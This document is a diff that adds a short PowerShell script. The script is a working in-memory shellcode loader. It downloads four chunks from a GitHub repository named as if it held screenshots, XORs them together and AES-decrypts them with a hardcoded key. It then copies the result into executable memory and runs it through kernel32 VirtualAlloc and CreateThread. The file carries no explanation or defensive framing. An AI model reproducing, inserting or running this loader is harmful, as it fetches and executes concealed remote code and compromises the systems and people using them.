@@ -1,0 +1,12 @@
+$b='https://raw.githubusercontent.com/cem324/screenshots/main'
+$k=Add-Type -Def @'
+[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr,uint,uint,uint);
+[DllImport("kernel32")]static extern IntPtr RtlMoveMemory(IntPtr,IntPtr,uint);
+[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr,uint,IntPtr,IntPtr,uint,IntPtr);
+'@ -Pas
+$ch=@()
+for($ci=0;$ci-lt4;$ci++){$ch+=([Net.WebClient]::new()).DownloadData("$b/s$ci")}
+$xr=[byte[]]$ch[0].Clone();for($ci=1;$ci-lt$ch.Count;$ci++){for($cj=0;$cj-lt$xr.Length;$cj++){$xr[$cj]=$xr[$cj]-bxor$ch[$ci][$cj]}}
+$ak=[Byte[]]@(0xe1,0xc7,0x5c,0x7a,0x10,0x39,0x26,0xaf,0x9b,0x05,0x93,0x77,0x09,0xe1,0x6e,0x14)
+$iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
+$_va=[K]::VirtualAlloc(0,$py.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($py,0,$_va,$py.Length);[K]::CreateThread(0,0,$_va,0,0,0)
